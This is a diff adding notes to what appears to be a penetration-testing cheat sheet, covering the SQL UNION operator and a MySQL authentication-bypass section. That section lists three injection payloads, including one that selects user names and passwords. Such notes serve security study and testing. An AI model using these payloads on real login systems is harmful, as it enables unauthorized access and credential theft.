@@ -78,8 +78,23 @@ Session Clean-up:
 ## SQL Injection
 ---  
 
+More SQLi cheatsheets: http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
+
 **Summary**  
 
-**Exploitation**  
+`UNION` operator is used to combine the resulting set of 2 or more SELECT statements.
+* e.g. `SELECT name FROM customers UNION SELECT name FROM suppliers`
+* ^Combines customer and suppliers names in one table, displaying distinct rows only.
+* `UNION ALL` is the same but displays all rows.  
+
+**Exploitation: Authentication Bypass (MySQL)**  
+
+```SQL
+' or '1'='1
+' UNION ALL SELECT CURRENT_USER, '1
+' UNION ALL SELECT name,pass FROM users WHERE name="noone"--    # whitespace needed after -- comment
+```
+
+
 
 **Mitigation**
